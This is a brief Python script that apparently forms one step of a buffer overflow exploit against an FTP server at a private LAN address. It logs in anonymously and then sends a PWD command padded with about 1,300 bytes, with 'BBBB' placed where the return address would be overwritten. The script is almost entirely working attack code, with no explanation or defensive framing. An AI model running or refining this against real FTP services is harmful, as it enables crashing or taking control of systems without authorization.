#!/usr/bin/python
import socket,time

buffer = "A" * 1192 + "BBBB" + "C" *(1300 - 1196)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.108',21))
time.sleep(2)
r = s.recv(2048)

s.send("USER anonymous\r\nn")
r = s.recv(1024)

s.send("PASS anonymous\r\n")
r = s.recv(1024)

s.send("PWD "+buffer+"\r\n")
r = s.recv(1024)
